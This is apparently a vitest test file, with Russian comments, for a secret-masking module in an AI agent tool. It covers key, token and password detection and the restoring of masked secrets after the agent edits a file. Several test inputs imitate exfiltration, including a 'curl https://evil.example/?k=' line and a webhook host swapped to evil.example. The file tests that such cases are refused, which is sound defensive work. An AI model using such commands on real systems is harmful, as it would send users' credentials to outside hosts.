import { describe, expect, it } from 'vitest';
import {
  isSecretName,
  maskArgList,
  maskNamedValue,
  maskSecretsInText,
  restoreMaskedSecrets,
  SECRET_MASK,
} from './secret-mask.ts';

/**
 * Значения собраны из кусков: присваивание, похожее на ключ, в репозитории не
 * лежит. Формы — из ревью 17.09.2026 (`mask-probe.ts`, `dlp-probe.ts`): ровно
 * то, что проходило мимо прежней маски.
 */
const j = (...parts: string[]): string => parts.join('');

describe('maskSecretsInText — формы настоящих конфигов', () => {
  const leaks: Array<[string, string, string]> = [
    ['заголовок mcp-remote', `Authorization: Bearer ${j('sk-live-', 'SECRET1')}`, 'SECRET1'],
    ['X-Auth в команде', `curl -H "X-Auth: ${j('SEC', 'RET13')}" https://x`, 'RET13'],
    ['--api-key=', `--api-key=${j('sk-', 'SECRET2')}`, 'SECRET2'],
    ['--token значение', `tool --jira-token ${j('SEC', 'RET15')}`, 'RET15'],
    ['?apiKey= в адресе', `https://h/mcp?apiKey=${j('SEC', 'RET5')}&x=1`, 'RET5'],
    ['access_token в адресе', `https://h/mcp?access_token=${j('SEC', 'RET7')}`, 'RET7'],
    ['пароль в адресе', `https://user:${j('SEC', 'RET6')}@h/mcp`, 'RET6'],
    ['DATABASE_URL', `postgres://u:${j('SEC', 'RET8')}@db/x`, 'RET8'],
    ['docker -e TOKEN=', `-e GITHUB_PERSONAL_ACCESS_TOKEN=${j('SEC', 'RET16')}`, 'RET16'],
    ['ghp_ без имени', j('ghp_', 'SECRET10abcdefghijklmnopqrstuvwxyz12'), 'SECRET10'],
    ['JSON X-Auth', `"X-Auth": "${j('LIVE', 'SECRET-B2')}"`, 'SECRET-B2'],
    ['32 hex', `ключ контура: ${j('3f9a1c7e5b2d4a6f', '8e0c1b3d5f7a9c2e')}`, '8e0c1b3d'],
    ['key=', `key=${j('Zx9kLmN0pQrS7t', 'UvWxYz12345')}`, 'UvWxYz'],
    ['gor_live_', j('gor_live_7Hk2mP9qR4sT6v', 'W8xY0zA1bC3dE5fG'), 'W8xY0z'],
    ['пароль словами', `пароль от джиры ${j('Qwerty!', '2345')}`, 'Qwerty'],
  ];
  it.each(leaks)('%s — значение скрыто', (_name, text, fragment) => {
    const masked = maskSecretsInText(text);
    expect(masked).not.toContain(fragment);
    expect(masked).toContain(SECRET_MASK);
  });

  const clean = [
    'C:\\work\\agentdeck\\apps\\server\\src\\routes\\panel-agent\\actions-config.ts',
    'https://gitlab.example.com/api/v4/mcp',
    'b3705c71-a8c9-4d59-affb-6429d074639e',
    'Открой страницу правил и добавь правило про тесты, модель claude-opus-4-5-20251101',
    'Primary key: id column',
    'author: Ivan',
    'поменяй пароль в файле config.v2.json',
    'пароль должен быть длинным',
    '"API_KEY": "${API_KEY}"',
    'Authorization: Bearer ${GITLAB_TOKEN}',
    'npx -y @modelcontextprotocol/server-filesystem C:/work',
    '2026-09-17T08:59:49.682Z',
    'Accept: application/json',
    'panel-agent-routes.integration.test.ts',
    'useChatMessagesPlaceholderData2',
    'MAX_THINKING_TOKENS держим в настройках',
  ];
  it.each(clean)('без ложного срабатывания: %s', (text) => {
    expect(maskSecretsInText(text)).toBe(text);
  });
});

describe('имена и структурные значения', () => {
  it('секретные имена — по сегментам, без «author» и «hotkey»', () => {
    for (const name of ['X-Auth', 'PRIVATE-TOKEN', 'X-Goog-Api-Key', 'primaryApiKey', 'Cookie']) {
      expect(isSecretName(name), name).toBe(true);
    }
    for (const name of ['author', 'hotkey', 'Accept', 'GITLAB_API_URL', 'url']) {
      expect(isSecretName(name), name).toBe(false);
    }
  });

  it('значение по имени: секретное имя прячет целиком, ссылка остаётся', () => {
    expect(maskNamedValue('X-Auth', 'abc')).toBe(SECRET_MASK);
    expect(maskNamedValue('JIRA_API_TOKEN', '${JIRA_API_TOKEN}')).toBe('${JIRA_API_TOKEN}');
    expect(maskNamedValue('DATABASE_URL', 'postgres://u:pw1234@h/db')).toBe(
      `postgres://u:${SECRET_MASK}@h/db`,
    );
    expect(maskNamedValue('GITLAB_API_URL', 'https://gitlab.example.com')).toBe(
      'https://gitlab.example.com',
    );
  });

  it('аргументы: значение после секретного флага и заголовок mcp-remote', () => {
    expect(
      maskArgList(['mcp-remote', 'https://h/mcp', '--header', 'Authorization: Bearer abc123']),
    ).toEqual(['mcp-remote', 'https://h/mcp', '--header', `Authorization: Bearer ${SECRET_MASK}`]);
    expect(maskArgList(['--password', 'x', '--port', '3000'])).toEqual([
      '--password',
      SECRET_MASK,
      '--port',
      '3000',
    ]);
  });
});

describe('restoreMaskedSecrets — правка текста, прочитанного маской', () => {
  const saved = `export API_TOKEN=${j('VALUE', '9f8e7d6c5b4a3f2e1d0c')}\nexport DEBUG=1\n`;

  it('маски на своих местах — секреты возвращаются, правка остаётся', () => {
    const sent = maskSecretsInText(saved).replace('DEBUG=1', 'DEBUG=0');
    expect(sent).toContain(SECRET_MASK);
    expect(restoreMaskedSecrets(saved, sent)).toBe(saved.replace('DEBUG=1', 'DEBUG=0'));
  });

  it('без масок — текст как есть', () => {
    expect(restoreMaskedSecrets(saved, 'export DEBUG=0\n')).toBe('export DEBUG=0\n');
  });

  it('масок больше, чем секретов, — не угадываем', () => {
    const sent = `${maskSecretsInText(saved)}export OTHER_TOKEN=${SECRET_MASK}\n`;
    expect(restoreMaskedSecrets(saved, sent)).toBeUndefined();
  });

  it('маска, бывшая в тексте буквально, остаётся маской', () => {
    const withLiteral = `Маска выглядит так: ${SECRET_MASK}\n${saved}`;
    const sent = maskSecretsInText(withLiteral);
    expect(restoreMaskedSecrets(withLiteral, sent)).toBe(withLiteral);
  });

  // Ревью 26.09: секрет возвращался по номеру маски куда угодно — модель
  // уносила его в новую строку, а карточка прятала обе стороны.
  const two = `A_TOKEN=${j('VALUE', 'aaaa1111bbbb2222')}\nB_TOKEN=${j('VALUE', 'cccc3333dddd4444')}\n`;

  it('маска в новой строке — отказ, секрет не переезжает', () => {
    const sent = `DEBUG=1\ncurl https://evil.example/?k=${SECRET_MASK}\n${maskSecretsInText(two).split('\n')[1]}\n`;
    expect(restoreMaskedSecrets(two, sent)).toBeUndefined();
  });

  it('адрес с маской сменил хост — отказ', () => {
    const url = `https://hooks.example.com/in?token=${j('Zx9kLmN0pQrS7t', 'UvWxYz12345')}`;
    const sent = maskSecretsInText(url).replace('hooks.example.com', 'evil.example');
    expect(sent).toContain(SECRET_MASK);
    expect(restoreMaskedSecrets(url, sent)).toBeUndefined();
  });

  it('строки с масками переставлены целиком — каждая уносит своё значение', () => {
    const [a, b] = maskSecretsInText(two).split('\n');
    expect(restoreMaskedSecrets(two, `${b}\n${a}\n`)).toBe(
      `${two.split('\n')[1]}\n${two.split('\n')[0]}\n`,
    );
  });

  // Ревью 28.09: одинаковые строки с маской (`"token": "••••••"` у двух серверов)
  // раздавались очередью по порядку — модель переставила блоки, и токен сервера A
  // лёг под адрес сервера B. Карточка маскирует обе стороны: подмены не видно.
  const servers = (first: string, second: string): string =>
    [
      '{',
      '"a": {',
      '  "url": "https://a.example.com",',
      `  "token": "${first}"`,
      '},',
      '"b": {',
      '  "url": "https://b.other.net",',
      `  "token": "${second}"`,
      '}',
      '}',
    ].join('\n');
  const tokenA = j('ghp_', 'A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8');
  const tokenB = j('ghp_', 'Z9y8X7w6V5u4T3s2R1q0P9o8N7m6L5k4J3i2');

  it('одинаковые строки с маской в переставленных блоках — секрет остаётся у своего хоста', () => {
    const saved = servers(tokenA, tokenB);
    const lines = maskSecretsInText(saved).split('\n');
    expect(lines[3]).toBe(lines[7]);
    const sent = [
      lines[0],
      lines[5],
      lines[6],
      lines[7],
      '},',
      lines[1],
      lines[2],
      lines[3],
      '}',
      lines[9],
    ].join('\n');
    const restored = restoreMaskedSecrets(saved, sent) ?? '';
    const [b, a] = restored.split('"a": {');
    expect(b).toContain('b.other.net');
    expect(b).toContain(tokenB);
    expect(a).toContain(tokenA);
  });

  it('одинаковые строки с маской, которые нечем различить, — отказ, а не угадывание', () => {
    const saved = [`  "token": "${tokenA}"`, `  "token": "${tokenB}"`].join('\n');
    const [first, second] = maskSecretsInText(saved).split('\n');
    expect(restoreMaskedSecrets(saved, `${second}\n${first}`)).toBeUndefined();
  });

  it('правка соседней строки не мешает вернуть единственную маску', () => {
    const saved = ['{', '  "url": "https://a.example.com",', `  "token": "${tokenA}"`, '}'].join(
      '\n',
    );
    const sent = maskSecretsInText(saved).replace('a.example.com', 'a.example.com/v2');
    expect(restoreMaskedSecrets(saved, sent)).toBe(
      saved.replace('a.example.com', 'a.example.com/v2'),
    );
  });

  it('одинаковые строки с маской: сменил адрес над своей — отказ, секрет не уезжает', () => {
    const saved = servers(tokenA, tokenB);
    const sent = maskSecretsInText(saved).replace('a.example.com', 'evil.example');
    expect(restoreMaskedSecrets(saved, sent)).toBeUndefined();
  });
});

/**
 * Флаг и значение — соседние элементы списка (U0, прогон всех действий агента
 * 28.09.2026): карточка удаления MCP-сервера показывала `"--api-key",` и значение
 * строкой ниже, перенос в codex — `args = [ "server.js", "--api-key", "…" ]`.
 */
describe('maskSecretsInText — аргументы списком', () => {
  const value = j('swpma', 'mgqqhjpgnjqz45');
  const leaks: Array<[string, string]> = [
    ['TOML одной строкой', `args = [ "server.js", "--api-key", "${value}" ]`],
    ['JSON на соседних строках', `  "args": [\n    "--api-key",\n    "${value}"\n  ]`],
    ['строки удалённого диффа', `-        "--api-key",\n-        "${value}"`],
    ['строки добавленного диффа', `+        '--token',\n+        '${value}'`],
    ['YAML пунктами', `args:\n  - server.js\n  - --api-key\n  - ${value}`],
    ['YAML в диффе, в кавычках', `+  - "--api-key"\n+  - "${value}"`],
  ];
  it.each(leaks)('%s — значение скрыто', (_name, text) => {
    const masked = maskSecretsInText(text);
    expect(masked).not.toContain(value);
    expect(masked).toContain(SECRET_MASK);
  });

  const clean = [
    'args = [ "server.js", "--port", "8080" ]',
    '"args": [\n  "--api-key",\n  "${API_KEY}"\n]',
    'args = [ "--token", "--verbose" ]',
    'args:\n  - --port\n  - 8080',
    '"--api-key", ""',
  ];
  it.each(clean)('без ложного срабатывания: %j', (text) => {
    expect(maskSecretsInText(text)).toBe(text);
  });

  it('прочитанный маской список возвращается правкой строка в строку', () => {
    const saved = `{\n  "args": [\n    "--api-key",\n    "${value}"\n  ],\n  "command": "node"\n}`;
    const sent = maskSecretsInText(saved).replace('"node"', '"bun"');
    expect(sent).not.toContain(value);
    expect(restoreMaskedSecrets(saved, sent)).toBe(saved.replace('"node"', '"bun"'));
  });
});

// Ревью U0, m3 (28.09.2026): `/` рвал base64 на куски короче порога, и ни один не
// узнавался. Стандартный base64 с `/`, `+` и `=` — один непрозрачный токен (от 32).
describe('base64 с `/` и `=` — один токен', () => {
  const blob = j('q8Zr/Lk2Wm9', 'Xa7/Tb4Nc1Pd', '+Ve6Hf3Jg0Rs5Yu=');
  it.each([
    ['в прозе', `the backup key is ${blob} keep it`],
    ['в кавычках JSON', `{"note": "${blob}"}`],
    ['после двоеточия', `blob: ${blob}`],
    ['с паддингом ==', `x ${blob.slice(0, -1)}== y`],
  ])('%s: скрыт целиком', (_name, text) => {
    const masked = maskSecretsInText(text);
    expect(masked).toContain(SECRET_MASK);
    for (const piece of blob.split(/[/+=]/).filter((part) => part.length >= 4)) {
      expect(masked).not.toContain(piece);
    }
  });

  it.each([
    'apps/server/src/routes/panel-agent/capability-ledger.ts',
    'see /usr/local/lib/node_modules/typescript/lib/tsc.js',
    'C:\\Users\\me\\AppData\\Local\\Temp\\project\\src\\index.ts',
    'https://example.com/docs/getting-started/install/windows',
    'src/components/Button12/Button34Story56/index.tsx',
    'ratio 3/4 of 128/256 bytes',
  ])('обычный путь или адрес не трогается: %j', (text) => {
    expect(maskSecretsInText(text)).toBe(text);
  });
});

/**
 * Имя временной папки — слова через дефис и случайный хвост `mkdtemp` (ревью A,
 * 28.09: 14 из 300 имён `cc-agent-gaps-walk-XXXXXX` уходили модели меткой ключа,
 * и агент не мог назвать путь, который ему дал человек). Хвост в шесть знаков —
 * не ключ; ключ со словом-префиксом (`live_`, `prod-`) остаётся ключом по своему
 * длинному куску.
 */
describe('имена со словами и случайным хвостом', () => {
  const ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let seed = 28_09;
  const next = (): number => {
    seed = (seed * 1_103_515_245 + 12_345) % 2 ** 31;
    return seed;
  };
  const suffix = (): string =>
    Array.from({ length: 6 }, () => ALPHABET[next() % ALPHABET.length]).join('');

  it('300 имён mkdtemp в пути — ни одно не спрятано', () => {
    const hidden = Array.from({ length: 300 }, () => {
      const text = `C:\\Users\\me\\AppData\\Local\\Temp\\cc-agent-gaps-walk-${suffix()}`;
      return maskSecretsInText(text) === text ? undefined : text;
    }).filter(Boolean);
    expect(hidden).toEqual([]);
  });

  it.each([
    ['слово и длинный случайный кусок', j('prod-', 'q8ZrLk2Wm9Xa7Tb4Nc1PdVe6')],
    ['префикс с подчёркиваниями', j('rk_live_', 'Hf3Jg0Rs5Yu2Kp9Lm4Zx7Cv1')],
    // Хвост короче 24 и ключ из половин: прежнее правило судило только самый
    // длинный кусок и пропускало их (ревью сит, 28.09).
    ['хвост 23 знака', j('prod-', 'q8ZrLk2Wm9Xa7Tb4Nc1PdVe')],
    ['хвост 20 знаков', j('live_', 'Hf3Jg0Rs5Yu2Kp9Lm4Zx')],
    ['тестовый ключ вендора', j('sk_test_', '4eC39HqLyjWDarjtT1zdp7d')],
    ['две половины по 16', j('prod-', 'Xk9fLm2QpR7tZ4wB', '-Yh8nC3vJ6sD1gF5')],
    ['слово посередине', j('Xk9fLm2QpR7t', '-abcd-', 'Zq4wB8nC3vJ6sD1gF5')],
  ])('%s — по-прежнему ключ', (_name, key) => {
    expect(maskSecretsInText(`token here ${key} end`)).not.toContain(key.slice(-8));
  });
});

/**
 * Ключ с одной-двумя цифрами (ревью сит, 28.09): маска отличала имя в коде от
 * ключа только числом цифр и пропускала такие ключи — из 32 знаков каждый
 * десятый, из 24 каждый четвёртый. Теперь при малом числе цифр решает форма слов.
 */
describe('непрозрачный ключ с малым числом цифр', () => {
  it.each([
    ['без цифр, 32 знака', j('RBTOVPdEIZmlay', 'iyoKfaDCQiGYSrnuE')],
    ['одна цифра, 32 знака', j('AlcUveHFKEJfahSm', 'VxNiPwDAvh7VNvqz')],
    ['две цифры, 24 знака', j('slJninlqP7j4', 'lRuxyDCHvLqz')],
    ['base64url с дефисом внутри', j('iiCllLmnfDlEQPPPQEQJ', '-Nvc_QgLENL7')],
    ['24 знака с дефисом на краю', j('-hQ9NdsZTPsZ5M0f', 'mswRlxdK')],
  ])('%s — ключ', (_name, key) => {
    const body = key.replace(/^-/, '');
    expect(maskSecretsInText(`k ${key} k`)).not.toContain(body.slice(-10));
  });

  it.each([
    'interruptOnBackgroundLost',
    'anthropicRequestToOpenAi',
    'exponentialRampToValueAtTime',
    'XMLHttpRequestHandlerFactory',
    'useChatMessagesPlaceholderData2',
    'NtQuerySystemInformation',
    'refetchIntervalInBackground',
    'AGENTDECK-PROBE-HOOK-BLOCKED-2a0541',
    '--keyboardShouldPersistTaps',
  ])('%s — имя, не ключ', (name) => {
    expect(maskSecretsInText(`x ${name} x`)).toBe(`x ${name} x`);
  });

  it('случайные ключи без подсказки: из 1000 открытыми остаются единицы', () => {
    const ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
    // mulberry32: у простого LCG по модулю 64 короткий период, и он рисует
    // `U0U0U0…`, а это не ключ — энтропия такой строки ниже порога по праву.
    let seed = 2809;
    const next = (): number => {
      seed = (seed + 0x6d2b79f5) | 0;
      let t = Math.imul(seed ^ (seed >>> 15), 1 | seed);
      t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
      return (t ^ (t >>> 14)) >>> 0;
    };
    let lowDigit = 0;
    let leaked = 0;
    for (let i = 0; i < 1000; i += 1) {
      const key = Array.from({ length: 32 }, () => ALPHABET[next() % ALPHABET.length]).join('');
      if (key.replace(/[^0-9]/g, '').length < 3) lowDigit += 1;
      if (maskSecretsInText(`k ${key} k`).includes(key)) leaked += 1;
    }
    // Предусловие: в выборке есть ключи, которые прежнее правило пропускало.
    expect(lowDigit).toBeGreaterThan(50);
    expect(leaked).toBeLessThanOrEqual(3);
  });
});
